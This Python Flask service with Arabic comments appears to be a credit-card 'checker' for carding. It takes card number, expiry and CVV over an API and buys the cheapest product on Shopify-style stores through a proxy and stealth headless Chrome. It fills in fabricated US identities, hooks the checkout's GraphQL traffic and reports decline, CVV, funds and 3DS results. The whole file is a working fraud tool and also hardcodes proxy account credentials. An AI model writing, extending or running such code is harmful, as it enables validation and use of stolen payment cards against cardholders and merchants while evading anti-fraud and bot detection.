# app.py - ملف API عالي الأداء مع دعم الطلبات المتعددة المتوازية + بروكسي مع undetected-chromedriver
import time
import re
import json
import requests
from urllib.parse import urljoin
import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait, Select
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.common.keys import Keys
from flask import Flask, request, jsonify
import os
import threading
import queue
from concurrent.futures import ThreadPoolExecutor, as_completed
import logging
import random
import subprocess

app = Flask(__name__)

# ==================== إعدادات الأداء ====================
MAX_WORKERS = 10
REQUEST_TIMEOUT = 60
executor = ThreadPoolExecutor(max_workers=MAX_WORKERS)

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

active_tasks = {}
active_tasks_lock = threading.Lock()

# ==================== قائمة البروكسيات ====================
PROXY_LIST = [
    {"host": "px440401.pointtoserver.com", "port": "10780", "user": "purevpn0s8732217", "pass": "i67s60ep"},
]

def get_random_proxy():
    return random.choice(PROXY_LIST)

def get_chrome_major_version():
    try:
        result = subprocess.run(['google-chrome', '--version'], capture_output=True, text=True)
        version_str = result.stdout.strip()
        match = re.search(r'(\d+)\.', version_str)
        if match:
            ver = int(match.group(1))
            logger.info(f"Detected Chrome version: {ver}")
            return ver
    except:
        pass
    
    try:
        result = subprocess.run(['chromium', '--version'], capture_output=True, text=True)
        version_str = result.stdout.strip()
        match = re.search(r'(\d+)\.', version_str)
        if match:
            ver = int(match.group(1))
            logger.info(f"Detected Chromium version: {ver}")
            return ver
    except:
        pass
    
    try:
        result = subprocess.run(['chromium-browser', '--version'], capture_output=True, text=True)
        version_str = result.stdout.strip()
        match = re.search(r'(\d+)\.', version_str)
        if match:
            ver = int(match.group(1))
            logger.info(f"Detected Chromium-browser version: {ver}")
            return ver
    except:
        pass
    
    return None

def create_driver_with_proxy(proxy_dict, task_id=None):
    proxy_host = proxy_dict['host']
    proxy_port = proxy_dict['port']
    proxy_user = proxy_dict['user']
    proxy_pass = proxy_dict['pass']
    
    options = uc.ChromeOptions()
    options.add_argument(f'--proxy-server=http://{proxy_host}:{proxy_port}')
    options.add_argument('--headless=new')
    options.add_argument('--no-sandbox')
    options.add_argument('--disable-dev-shm-usage')
    options.add_argument('--disable-blink-features=AutomationControlled')
    options.add_argument('--disable-web-security')
    options.add_argument('--disable-features=IsolateOrigins,site-per-process')
    options.add_argument('--disable-popup-blocking')
    options.add_argument('--disable-gpu')
    options.add_argument('--disable-notifications')
    options.add_argument('--disable-infobars')
    options.add_argument('--disable-extensions')
    options.add_argument('--window-size=1920,1080')
    options.add_argument('--start-maximized')
    options.add_argument('--disable-background-networking')
    options.add_argument('--disable-sync')
    options.add_argument('--disable-translate')
    options.add_argument('--disable-default-apps')
    options.add_argument('--mute-audio')
    options.add_argument('--no-first-run')
    options.add_argument('--no-default-browser-check')
    options.add_argument('--single-process')
    options.add_argument('--disable-ipc-flooding-protection')
    options.add_argument('--memory-pressure-off')
    options.add_argument('--disable-component-extensions-with-background-pages')
    options.add_argument('--disable-client-side-phishing-detection')
    options.add_argument('--disable-hang-monitor')
    options.add_argument('--disable-prompt-on-repost')
    options.add_argument('--disable-renderer-backgrounding')
    
    chrome_version = get_chrome_major_version()
    
    if chrome_version:
        logger.info(f"[{task_id}] Creating driver for Chrome {chrome_version} with proxy {proxy_host}:{proxy_port}")
        driver = uc.Chrome(options=options, version_main=chrome_version, use_subprocess=True)
    else:
        logger.info(f"[{task_id}] Creating driver with auto-detected Chrome + proxy")
        driver = uc.Chrome(options=options, use_subprocess=True)
    
    driver.execute_script("""
        Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
        window.chrome = {runtime: {}};
        Object.defineProperty(navigator, 'plugins', {get: () => [1, 2, 3, 4, 5]});
        Object.defineProperty(navigator, 'languages', {get: () => ['en-US', 'en']});
        const originalQuery = window.navigator.permissions.query;
        window.navigator.permissions.query = (parameters) => (
            parameters.name === 'notifications' ?
            Promise.resolve({state: Notification.permission}) :
            originalQuery(parameters)
        );
    """)
    
    return driver

# ==================== نظام توليد عناوين أمريكية متطابقة ====================
MATCHED_ADDRESSES = [
    {
        "first_name": "James", "last_name": "Smith", "full_name": "James Smith",
        "address1": "1200 Main St", "city": "New York", "state": "New York", "zip": "10001",
        "phone": "2125550101", "email_domain": "gmail.com"
    },
    {
        "first_name": "Mary", "last_name": "Johnson", "full_name": "Mary Johnson",
        "address1": "2500 Oak Ave", "city": "Los Angeles", "state": "California", "zip": "90001",
        "phone": "2135550202", "email_domain": "yahoo.com"
    },
    {
        "first_name": "Robert", "last_name": "Williams", "full_name": "Robert Williams",
        "address1": "3800 Maple Dr", "city": "Chicago", "state": "Illinois", "zip": "60601",
        "phone": "3125550303", "email_domain": "outlook.com"
    },
    {
        "first_name": "Patricia", "last_name": "Brown", "full_name": "Patricia Brown",
        "address1": "4500 Cedar Ln", "city": "Houston", "state": "Texas", "zip": "77001",
        "phone": "7135550404", "email_domain": "hotmail.com"
    },
    {
        "first_name": "John", "last_name": "Jones", "full_name": "John Jones",
        "address1": "5200 Elm St", "city": "Phoenix", "state": "Arizona", "zip": "85001",
        "phone": "6025550505", "email_domain": "protonmail.com"
    },
    {
        "first_name": "Jennifer", "last_name": "Garcia", "full_name": "Jennifer Garcia",
        "address1": "6800 Washington Ave", "city": "Philadelphia", "state": "Pennsylvania", "zip": "19101",
        "phone": "2155550606", "email_domain": "icloud.com"
    },
    {
        "first_name": "Michael", "last_name": "Miller", "full_name": "Michael Miller",
        "address1": "7500 Park Ave", "city": "San Antonio", "state": "Texas", "zip": "78201",
        "phone": "2105550707", "email_domain": "mail.com"
    },
    {
        "first_name": "Linda", "last_name": "Davis", "full_name": "Linda Davis",
        "address1": "8100 Lake Dr", "city": "San Diego", "state": "California", "zip": "92101",
        "phone": "6195550808", "email_domain": "aol.com"
    },
    {
        "first_name": "William", "last_name": "Rodriguez", "full_name": "William Rodriguez",
        "address1": "9300 Hill St", "city": "Dallas", "state": "Texas", "zip": "75201",
        "phone": "2145550909", "email_domain": "yandex.com"
    },
    {
        "first_name": "Elizabeth", "last_name": "Martinez", "full_name": "Elizabeth Martinez",
        "address1": "10400 Pine St", "city": "Austin", "state": "Texas", "zip": "73301",
        "phone": "5125551010", "email_domain": "zoho.com"
    },
]

def generate_matched_shipping_data():
    address = random.choice(MATCHED_ADDRESSES).copy()
    username = f"{address['first_name'].lower()}{address['last_name'].lower()}{random.randint(1, 999)}"
    address["email"] = f"{username}@{address['email_domain']}"
    return address

def extract_code_underscore_priority(all_codes, all_typenames, excluded_codes):
    
    valid_codes = []
    for code in all_codes:
        is_excluded = False
        for excluded in excluded_codes:
            if excluded in code:
                is_excluded = True
                break
        if not is_excluded:
            valid_codes.append(code)
    
    underscore_codes = [code for code in valid_codes if '_' in code]
    
    unwanted_patterns = [
        'Free_Postal_Shipping', 'UPS_', 'Economy_', 'First_', 'Standard_', 'Priority_',
        'GroundAdvantage_', 'MediaMail_', 'Flat_', 'Shipping_', 'Express_',
        'PrivacyBannerSettingsBulletPoints_', 'UiExtension_', 'fedex_ground_economy_',
        'CAMP_', 'by-items_', 'DELIVERY_', 'PAYMENTS_', 'BUYER_', 'REQUIRED_', 'WAITING_'
    ]
    
    filtered_underscore_codes = []
    for code in underscore_codes:
        is_unwanted = False
        for pattern in unwanted_patterns:
            if pattern in code:
                is_unwanted = True
                break
        if not is_unwanted:
            filtered_underscore_codes.append(code)
    
    if filtered_underscore_codes:
        return filtered_underscore_codes[0], None
    
    if all_typenames:
        typename_underscore = [t for t in all_typenames if '_' in t]
        filtered_typename_underscore = []
        for t in typename_underscore:
            is_unwanted = False
            for pattern in unwanted_patterns:
                if pattern in t:
                    is_unwanted = True
                    break
            if not is_unwanted:
                filtered_typename_underscore.append(t)
        
        if filtered_typename_underscore:
            return filtered_typename_underscore[0], filtered_typename_underscore[0]
    
    if valid_codes:
        return valid_codes[0], None
    
    if all_typenames:
        return all_typenames[0], all_typenames[0]
    
    return None, None

def fill_field(driver, field_name, value, wait):
    """تعبئة حقل معين مع معالجة الأخطاء"""
    try:
        element = wait.until(EC.presence_of_element_located((By.NAME, field_name)))
        element.clear()
        time.sleep(0.1)
        element.send_keys(value)
        logger.info(f"Field '{field_name}' filled with: {value}")
        return True
    except:
        try:
            element = driver.find_element(By.NAME, field_name)
            element.clear()
            element.send_keys(value)
            return True
        except:
            try:
                element = driver.find_element(By.CSS_SELECTOR, f'[name="{field_name}"]')
                element.clear()
                element.send_keys(value)
                return True
            except:
                try:
                    element = driver.find_element(By.ID, field_name)
                    element.clear()
                    element.send_keys(value)
                    return True
                except:
                    logger.warning(f"Could not fill field: {field_name}")
                    return False

def fill_card_field(driver, input_elem, value):
    """تعبئة حقول البطاقة باستخدام JavaScript"""
    driver.execute_script("""
        arguments[0].focus();
        arguments[0].value = '';
        arguments[0].value = arguments[1];
        arguments[0].dispatchEvent(new Event('input', {bubbles: true}));
        arguments[0].dispatchEvent(new Event('change', {bubbles: true}));
        arguments[0].dispatchEvent(new Event('blur', {bubbles: true}));
    """, input_elem, value)

def ff(ccx, site, task_id=None):
    
    if task_id:
        with active_tasks_lock:
            active_tasks[task_id] = {"status": "running", "started": time.time(), "cc": ccx, "site": site}
        logger.info(f"[{task_id}] Started task: {site}")
    
    shipping_data = generate_matched_shipping_data()
    
    parts = ccx.split('|')
    if len(parts) != 4:
        return {"success": False, "code": None, "error": "Invalid card format", "task_id": task_id}
    
    card_data = {
        "number": parts[0].strip(),
        "expiry": f"{parts[1].strip()}/{parts[2].strip()[-2:]}",
        "cvv": parts[3].strip(),
        "name": shipping_data["full_name"]
    }
    
    found_code = None
    found_typename = None
    total_amount = "$1.00"
    base_url = site.rstrip('/')
    response_result = None
    is_3ds = False
    order_confirmed = False
    checkout_url = None
    final_url = None
    order_number = None
    
    # ==================== 1. جلب رابط الدفع ====================
    try:
        proxy_dict = get_random_proxy()
        proxy_host = proxy_dict['host']
        proxy_port = proxy_dict['port']
        proxy_user = proxy_dict['user']
        proxy_pass = proxy_dict['pass']
        proxy_url = f"http://{proxy_user}:{proxy_pass}@{proxy_host}:{proxy_port}"
        proxies = {"http": proxy_url, "https": proxy_url}
        
        s = requests.Session()
        s.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'})
        
        digital_keywords = [
            'worry-free', 'protection', 'insurance', 'warranty', 'digital', 
            'download', 'ebook', 'pdf', 'gift card', 'membership', 'subscription',
            'service', 'guarantee', 'support'
        ]
        
        r = s.get(urljoin(site, '/products.json?limit=250'), proxies=proxies, timeout=15)
        if r.status_code != 200:
            return {"success": False, "code": None, "error": "Failed to fetch products", "task_id": task_id}
        
        products_data = r.json()
        shippable_products = []
        
        for p in products_data.get('products', []):
            title = p.get('title', '').lower()
            product_type = p.get('product_type', '').lower()
            vendor = p.get('vendor', '').lower()
            
            is_digital = False
            for keyword in digital_keywords:
                if keyword in title or keyword in product_type or keyword in vendor:
                    is_digital = True
                    break
            
            if is_digital:
                continue
            
            for v in p.get('variants', []):
                price = float(v.get('price', 0))
                available = v.get('available', True)
                if price > 0 and available and price >= 1.0:
                    shippable_products.append({
                        'title': p.get('title'),
                        'price': price,
                        'variant_id': v.get('id'),
                        'handle': p.get('handle')
                    })
        
        if not shippable_products:
            return {"success": False, "code": None, "error": "No shippable product", "task_id": task_id}
        
        cheapest = min(shippable_products, key=lambda x: x['price'])
        variant_id = cheapest['variant_id']
        total_amount = f"${cheapest['price']:.2f}"
        
        resp = s.post(urljoin(site, '/cart/add.js'), json={'quantity': 1, 'id': variant_id}, proxies=proxies, cookies=s.cookies, timeout=15)
        if resp.status_code != 200:
            return {"success": False, "code": None, "error": "Failed to add to cart", "task_id": task_id}
        
        response = s.post(f'{site}/cart', data={'checkout': ''}, proxies=proxies, cookies=s.cookies, timeout=15)
        checkout_url = response.url
        logger.info(f"[{task_id}] Checkout URL: {checkout_url}")
        
    except Exception as e:
        return {"success": False, "code": None, "error": str(e), "task_id": task_id}
    
    # ==================== 2. تشغيل المتصفح مع بروكسي ====================
    driver = None
    try:
        proxy_dict = get_random_proxy()
        driver = create_driver_with_proxy(proxy_dict, task_id)
        
        wait = WebDriverWait(driver, 20)
        driver.set_page_load_timeout(30)
        
        driver.get(checkout_url)
        time.sleep(3)
        
        # حفظ screenshot للتصحيح
        logger.info(f"[{task_id}] Page loaded: {driver.current_url[:100]}")
        logger.info(f"[{task_id}] Page title: {driver.title}")
        
        # ==================== 3. تعبئة الشحن ====================
        shipping_success = False
        try:
            # انتظار تحميل نموذج الشحن - نجرب عدة محددات للـ email
            logger.info(f"[{task_id}] Starting shipping fill...")
            
            # البحث عن حقل email بأي طريقة
            email_selectors = [
                (By.ID, "email"),
                (By.NAME, "email"),
                (By.CSS_SELECTOR, "input[type='email']"),
                (By.CSS_SELECTOR, "#email"),
                (By.CSS_SELECTOR, "[name='email']"),
                (By.CSS_SELECTOR, "input[placeholder*='email' i]"),
                (By.CSS_SELECTOR, "input[placeholder*='Email' i]"),
            ]
            
            email_field = None
            for by, selector in email_selectors:
                try:
                    email_field = wait.until(EC.presence_of_element_located((by, selector)))
                    if email_field:
                        logger.info(f"[{task_id}] Email field found: {by}={selector}")
                        break
                except:
                    continue
            
            if not email_field:
                logger.error(f"[{task_id}] Email field not found")
                return {"success": False, "code": None, "error": "Email field not found", "task_id": task_id}
            
            email_field.clear()
            email_field.send_keys(shipping_data["email"])
            logger.info(f"[{task_id}] Email filled: {shipping_data['email']}")
            time.sleep(1)
            
            # اختيار الدولة - أمريكا
            try:
                country_select = driver.find_element(By.NAME, "countryCode")
                if country_select:
                    Select(country_select).select_by_value("US")
                    time.sleep(0.5)
            except:
                try:
                    country_select = driver.find_element(By.CSS_SELECTOR, "[name='countryCode']")
                    Select(country_select).select_by_value("US")
                except:
                    pass
            
            # تعبئة الحقول
            fields_to_fill = {
                "firstName": shipping_data["first_name"],
                "lastName": shipping_data["last_name"],
                "address1": shipping_data["address1"],
                "city": shipping_data["city"],
                "postalCode": shipping_data["zip"],
                "phone": shipping_data["phone"]
            }
            
            for field_name, value in fields_to_fill.items():
                fill_field(driver, field_name, value, wait)
                time.sleep(0.3)
            
            # تعبئة الولاية
            try:
                state_select = Select(driver.find_element(By.NAME, "zone"))
                state_select.select_by_visible_text(shipping_data["state"])
                logger.info(f"[{task_id}] State selected: {shipping_data['state']}")
            except:
                try:
                    state_input = driver.find_element(By.NAME, "zone")
                    state_input.clear()
                    state_input.send_keys(shipping_data["state"])
                    state_input.send_keys(Keys.ENTER)
                except:
                    logger.warning(f"[{task_id}] Could not set state")
            
            time.sleep(1)
            
            # الضغط على Continue to shipping أو Continue to payment
            continue_selectors = [
                "//button[contains(text(), 'Continue to shipping')]",
                "//button[contains(text(), 'Continue to payment')]",
                "//button[contains(text(), 'Continue')]",
                "//button[@type='submit']",
                "button[type='submit']"
            ]
            
            continue_btn = None
            for xpath in continue_selectors:
                try:
                    buttons = driver.find_elements(By.XPATH, xpath)
                    for button in buttons:
                        if button.is_displayed() and button.is_enabled():
                            continue_btn = button
                            break
                    if continue_btn:
                        break
                except:
                    continue
            
            if continue_btn:
                driver.execute_script("arguments[0].scrollIntoView(true);", continue_btn)
                time.sleep(0.5)
                driver.execute_script("arguments[0].click();", continue_btn)
                logger.info(f"[{task_id}] Continue button clicked")
                time.sleep(3)
                shipping_success = True
            else:
                logger.error(f"[{task_id}] Continue button not found")
                # محاولة الضغط على أي زر submit
                driver.execute_script("""
                    var buttons = document.querySelectorAll('button');
                    for (var i = 0; i < buttons.length; i++) {
                        if (buttons[i].type === 'submit' || buttons[i].textContent.includes('Continue')) {
                            buttons[i].click();
                            break;
                        }
                    }
                """)
                time.sleep(3)
                shipping_success = True
            
            logger.info(f"[{task_id}] Shipping fill completed. Current URL: {driver.current_url[:100]}")
            
        except Exception as e:
            logger.error(f"[{task_id}] Shipping fill error: {str(e)}")
            try:
                logger.info(f"[{task_id}] Page source: {driver.page_source[:500]}")
            except:
                pass
            return {"success": False, "code": None, "error": f"Shipping fill failed: {str(e)}", "task_id": task_id}
        
        # ==================== 4. تعبئة الدفع ====================
        try:
            logger.info(f"[{task_id}] Starting payment fill...")
            time.sleep(2)
            
            driver.switch_to.default_content()
            
            # البحث عن iframes
            iframes = driver.find_elements(By.TAG_NAME, 'iframe')
            logger.info(f"[{task_id}] Found {len(iframes)} iframes")
            
            card_filled = False
            expiry_filled = False
            cvv_filled = False
            name_filled = False
            
            # أولاً نجرب تعبئة بدون iframe (بعض المواقع ما تستخدم iframe)
            all_inputs = driver.find_elements(By.TAG_NAME, 'input')
            logger.info(f"[{task_id}] Found {len(all_inputs)} inputs on main page")
            
            for input_elem in all_inputs:
                try:
                    data_field = input_elem.get_attribute('data-field') or ''
                    placeholder = (input_elem.get_attribute('placeholder') or '').lower()
                    autocomplete = (input_elem.get_attribute('autocomplete') or '').lower()
                    name = (input_elem.get_attribute('name') or '').lower()
                    id_attr = (input_elem.get_attribute('id') or '').lower()
                    
                    if not card_filled and ('number' in data_field or 'card number' in placeholder or 'cc-number' in autocomplete or 'cardnumber' in name or 'number' in id_attr):
                        fill_card_field(driver, input_elem, card_data["number"])
                        card_filled = True
                        logger.info(f"[{task_id}] Card number filled (main)")
                        time.sleep(0.3)
                    
                    elif not expiry_filled and ('expiry' in data_field or 'expiry' in placeholder or 'cc-exp' in autocomplete or 'exp-date' in name or 'expiry' in id_attr):
                        fill_card_field(driver, input_elem, card_data["expiry"])
                        expiry_filled = True
                        logger.info(f"[{task_id}] Expiry filled (main)")
                        time.sleep(0.3)
                    
                    elif not cvv_filled and ('cvv' in data_field or 'cvv' in placeholder or 'cc-csc' in autocomplete or 'verification_value' in name or 'cvc' in id_attr):
                        fill_card_field(driver, input_elem, card_data["cvv"])
                        cvv_filled = True
                        logger.info(f"[{task_id}] CVV filled (main)")
                        time.sleep(0.3)
                    
                    elif not name_filled and ('name' in data_field or 'name' in placeholder or 'cc-name' in autocomplete or 'cardholder' in name):
                        fill_card_field(driver, input_elem, card_data["name"])
                        name_filled = True
                        logger.info(f"[{task_id}] Name filled (main)")
                        time.sleep(0.3)
                except:
                    pass
            
            # إذا ما انملت الحقول، نجرب داخل iframes
            if not (card_filled and expiry_filled and cvv_filled and name_filled):
                for iframe in iframes:
                    try:
                        driver.switch_to.frame(iframe)
                        inputs = driver.find_elements(By.TAG_NAME, 'input')
                        logger.info(f"[{task_id}] Checking iframe with {len(inputs)} inputs")
                        
                        for input_elem in inputs:
                            try:
                                data_field = input_elem.get_attribute('data-field') or ''
                                placeholder = (input_elem.get_attribute('placeholder') or '').lower()
                                autocomplete = (input_elem.get_attribute('autocomplete') or '').lower()
                                name = (input_elem.get_attribute('name') or '').lower()
                                id_attr = (input_elem.get_attribute('id') or '').lower()
                                
                                if not card_filled and ('number' in data_field or 'card number' in placeholder or 'cc-number' in autocomplete or 'cardnumber' in name or 'number' in id_attr):
                                    fill_card_field(driver, input_elem, card_data["number"])
                                    card_filled = True
                                    logger.info(f"[{task_id}] Card number filled (iframe)")
                                    time.sleep(0.3)
                                
                                elif not expiry_filled and ('expiry' in data_field or 'expiry' in placeholder or 'cc-exp' in autocomplete or 'exp-date' in name):
                                    fill_card_field(driver, input_elem, card_data["expiry"])
                                    expiry_filled = True
                                    logger.info(f"[{task_id}] Expiry filled (iframe)")
                                    time.sleep(0.3)
                                
                                elif not cvv_filled and ('cvv' in data_field or 'cvv' in placeholder or 'cc-csc' in autocomplete or 'verification_value' in name):
                                    fill_card_field(driver, input_elem, card_data["cvv"])
                                    cvv_filled = True
                                    logger.info(f"[{task_id}] CVV filled (iframe)")
                                    time.sleep(0.3)
                                
                                elif not name_filled and ('name' in data_field or 'name' in placeholder or 'cc-name' in autocomplete or 'cardholder' in name):
                                    fill_card_field(driver, input_elem, card_data["name"])
                                    name_filled = True
                                    logger.info(f"[{task_id}] Name filled (iframe)")
                                    time.sleep(0.3)
                            except:
                                pass
                        
                        driver.switch_to.default_content()
                        
                        if card_filled and expiry_filled and cvv_filled and name_filled:
                            break
                            
                    except:
                        driver.switch_to.default_content()
                        continue
            
            logger.info(f"[{task_id}] Payment fill status: card={card_filled}, expiry={expiry_filled}, cvv={cvv_filled}, name={name_filled}")
            
        except Exception as e:
            logger.error(f"[{task_id}] Payment fill error: {str(e)}")
            return {"success": False, "code": None, "error": f"Payment error: {str(e)}", "task_id": task_id}
        
        # ==================== 5. اعتراض GraphQL ====================
        try:
            script = """
            window.graphqlResponses = [];
            window.allResponses = [];
            window.pollForReceiptResponses = [];
            
            var originalFetch = window.fetch;
            window.fetch = function(url, options) {
                return originalFetch.apply(this, arguments).then(function(response) {
                    var clone = response.clone();
                    var responseUrl = url;
                    var requestBody = null;
                    
                    if (options && options.body) {
                        try { requestBody = options.body; } catch(e) {}
                    }
                    
                    clone.text().then(function(text) {
                        var data = {url: responseUrl, body: text, requestBody: requestBody, timestamp: new Date().toISOString()};
                        window.allResponses.push(data);
                        
                        if (responseUrl && responseUrl.includes('/checkouts/internal/graphql/persisted')) {
                            var isProposal = false;
                            if (requestBody) {
                                try {
                                    var parsedBody = JSON.parse(requestBody);
                                    if (parsedBody.operationName === 'Proposal') isProposal = true;
                                } catch(e) {}
                            }
                            if (!isProposal) {
                                window.graphqlResponses.push(data);
                                if (requestBody) {
                                    try {
                                        var parsedBody2 = JSON.parse(requestBody);
                                        if (parsedBody2.operationName === 'PollForReceipt') window.pollForReceiptResponses.push(data);
                                    } catch(e) {}
                                }
                            }
                        }
                    });
                    return response;
                });
            };
            
            var originalXHROpen = XMLHttpRequest.prototype.open;
            var originalXHRSend = XMLHttpRequest.prototype.send;
            XMLHttpRequest.prototype.open = function(method, url) { this._url = url; return originalXHROpen.apply(this, arguments); };
            XMLHttpRequest.prototype.send = function(body) {
                var self = this;
                this.addEventListener('load', function() {
                    try {
                        var data = {url: self._url, body: self.responseText, requestBody: body, timestamp: new Date().toISOString()};
                        window.allResponses.push(data);
                        if (self._url && self._url.includes('/checkouts/internal/graphql/persisted')) {
                            var isProposal = false;
                            if (body) {
                                try { var p = JSON.parse(body); if (p.operationName === 'Proposal') isProposal = true; } catch(e) {}
                            }
                            if (!isProposal) {
                                window.graphqlResponses.push(data);
                                if (body) {
                                    try { var p2 = JSON.parse(body); if (p2.operationName === 'PollForReceipt') window.pollForReceiptResponses.push(data); } catch(e) {}
                                }
                            }
                        }
                    } catch(e) {}
                });
                return originalXHRSend.apply(this, arguments);
            };
            """
            driver.execute_script(script)
            time.sleep(0.5)
            
            # ==================== 6. الضغط على Pay ====================
            driver.switch_to.default_content()
            time.sleep(1)
            
            pay_selectors = [
                "//button[contains(text(), 'Pay now')]",
                "//button[contains(text(), 'Pay') and not(contains(text(), 'Pal'))]",
                "//button[contains(text(), 'Complete order')]",
                "//button[contains(text(), 'Place order')]",
                "//button[@type='submit']",
                "//input[@type='submit']"
            ]
            
            pay_button = None
            for xpath in pay_selectors:
                try:
                    buttons = driver.find_elements(By.XPATH, xpath)
                    for button in buttons:
                        if button.is_displayed() and button.is_enabled():
                            pay_button = button
                            break
                    if pay_button:
                        break
                except:
                    continue
            
            if pay_button:
                driver.execute_script("arguments[0].scrollIntoView(true);", pay_button)
                time.sleep(0.5)
                driver.execute_script("arguments[0].click();", pay_button)
                logger.info(f"[{task_id}] Pay button clicked")
            else:
                driver.execute_script("""
                    var buttons = document.querySelectorAll('button, input[type="submit"]');
                    for (var i = 0; i < buttons.length; i++) {
                        var text = (buttons[i].textContent || buttons[i].value || '').toLowerCase();
                        if (text.includes('pay') || text.includes('complete') || text.includes('place') || text.includes('order')) {
                            buttons[i].click();
                            return;
                        }
                    }
                """)
                logger.info(f"[{task_id}] Fallback pay button click executed")
            
            # ==================== 7. استخراج الكود ====================
            found_code = None
            found_typename = None
            all_codes = []
            all_typenames = []
            is_3ds = False
            order_confirmed = False
            order_number = None
            
            excluded_codes = [
                'REQUIRED_ARTIFACTS_UNAVAILABLE', 'PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT',
                'BUYER_IDENTITY_MISSING_CONTACT_METHOD', 'PAYMENTS_ADDRESS1_REQUIRED',
                'PAYMENTS_LAST_NAME_REQUIRED', 'PAYMENTS_FIRST_NAME_REQUIRED',
                'PAYMENTS_ZONE_REQUIRED_FOR_COUNTRY', 'PAYMENTS_POSTAL_CODE_REQUIRED',
                'DELIVERY_ZONE_REQUIRED_FOR_COUNTRY', 'DELIVERY_POSTAL_CODE_REQUIRED',
                'PAYMENTS_CITY_REQUIRED', 'WAITING_PENDING_TERMS', 'Free Postal Shipping',
                'UPS', 'DELIVERY_PHONE_NUMBER_REQUIRED', 'Economy',
                'DELIVERY_INVALID_POSTAL_CODE_FOR_ZONE', 'First', 'by-items',
                'Standard', 'Priority', 'PAYMENTS_INVALID_POSTAL_CODE_FOR_ZONE',
                'GroundAdvantage', 'MediaMail'
            ]
            
            for attempt in range(10):
                time.sleep(1.5)
                
                poll_responses = driver.execute_script("return window.pollForReceiptResponses || [];")
                graphql_responses = driver.execute_script("return window.graphqlResponses || [];")
                current_url = driver.current_url
                final_url = current_url
                
                if '/thank_you' in current_url:
                    order_confirmed = True
                    found_code = 'ORDER_CONFIRMED'
                    response_result = 'Order confirmed'
                    order_match = re.search(r'order_([A-Z0-9]+)', current_url, re.IGNORECASE)
                    if order_match:
                        order_number = order_match.group(1)
                    break
                
                try:
                    page_source = driver.page_source
                    if 'Your order is confirmed' in page_source or 'Thank you for your purchase' in page_source or 'thank you for your order' in page_source.lower():
                        order_confirmed = True
                        found_code = 'ORDER_CONFIRMED'
                        response_result = 'Order confirmed'
                        order_match = re.search(r'Order #?([A-Z0-9]+)', page_source, re.IGNORECASE)
                        if order_match:
                            order_number = order_match.group(1)
                        break
                except:
                    pass
                
                all_responses = poll_responses + graphql_responses
                
                for resp in all_responses:
                    body = resp.get('body', '')
                    url = resp.get('url', '')
                    
                    if not body:
                        continue
                    
                    if 'thank_you' in body.lower() or 'order confirmed' in body.lower():
                        order_confirmed = True
                        found_code = 'ORDER_CONFIRMED'
                        response_result = 'Order confirmed'
                        break
                    
                    if 'CompletePaymentChallenge' in body:
                        is_3ds = True
                        found_code = '3DS_REQUIRED'
                        found_typename = 'CompletePaymentChallenge'
                        response_result = '3DS Secure required'
                        break
                    
                    # استخراج code
                    pattern = r'"code"\s*:\s*"([^"]+)"'
                    matches = re.findall(pattern, body, re.IGNORECASE)
                    for code in matches:
                        if len(code) > 3 and len(code) < 80 and ' ' not in code:
                            if code not in all_codes:
                                all_codes.append(code)
                    
                    # استخراج typename
                    if '__typename' in body:
                        pattern = r'"__typename"\s*:\s*"([^"]+)"'
                        matches = re.findall(pattern, body, re.IGNORECASE)
                        for typename in matches:
                            if typename not in ['Query', 'Mutation', 'Subscription']:
                                if typename not in all_typenames:
                                    all_typenames.append(typename)
                    
                    # كلمات دلالية
                    body_upper = body.upper()
                    if 'INCORRECT_ZIP' in body_upper: all_codes.append('INCORRECT_ZIP')
                    if 'INSUFFICIENT_FUNDS' in body_upper: all_codes.append('INSUFFICIENT_FUNDS')
                    if 'INCORRECT_CVC' in body_upper: all_codes.append('INCORRECT_CVC')
                    if 'CARD_DECLINED' in body_upper: all_codes.append('CARD_DECLINED')
                    if 'FRAUD' in body_upper: all_codes.append('FRAUD_SUSPECTED')
                
                if found_code or order_confirmed:
                    break
                
                final_url = driver.current_url
            
            try:
                final_url = driver.current_url
            except:
                pass
            
            if driver:
                driver.quit()
            
            # ==================== نتيجة الاستخراج ====================
            if order_confirmed:
                result_code = 'ORDER_CONFIRMED'
                result_typename = 'OrderConfirmed'
                response_result = f'Order confirmed{f" - Order #{order_number}" if order_number else ""}'
            elif is_3ds or found_code == '3DS_REQUIRED':
                result_code = '3DS_REQUIRED'
                result_typename = found_typename or 'CompletePaymentChallenge'
            elif found_code and found_code not in excluded_codes:
                result_code = found_code
                result_typename = found_typename
            else:
                extracted_code, extracted_typename = extract_code_underscore_priority(
                    all_codes, all_typenames, excluded_codes
                )
                result_code = extracted_code
                result_typename = extracted_typename
            
            if task_id:
                with active_tasks_lock:
                    if task_id in active_tasks:
                        active_tasks[task_id]["status"] = "completed"
            
            return {
                "success": True if result_code else False,
                "code": result_code,
                "typename": result_typename,
                "response": response_result,
                "price": total_amount,
                "order_number": order_number,
                "checkout_url": checkout_url,
                "final_url": final_url,
                "error": None if result_code else "Code not found",
                "task_id": task_id
            }
        
        except Exception as e:
            if driver:
                driver.quit()
            return {"success": False, "code": None, "error": str(e), "task_id": task_id}
    
    except Exception as e:
        if driver:
            driver.quit()
        return {"success": False, "code": None, "error": str(e), "task_id": task_id}

# ==================== Routes ====================
@app.route('/', methods=['GET'])
def home():
    cc = request.args.get('cc')
    url = request.args.get('url')
    
    if not cc or not url:
        return jsonify({"success": False, "code": None, "error": "Missing cc or url parameters"})
    
    task_id = f"task_{int(time.time()*1000)}_{random.randint(1000,9999)}"
    future = executor.submit(ff, cc, url, task_id)
    
    try:
        result = future.result(timeout=REQUEST_TIMEOUT)
        return jsonify(result)
    except Exception as e:
        return jsonify({"success": False, "code": None, "error": f"Timeout: {str(e)}", "task_id": task_id})

@app.route('/health', methods=['GET'])
def health():
    return jsonify({"status": "ok", "max_workers": MAX_WORKERS, "chrome_version": get_chrome_major_version()})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    logger.info(f"Starting server on port {port}")
    app.run(host='0.0.0.0', port=port, threaded=True)
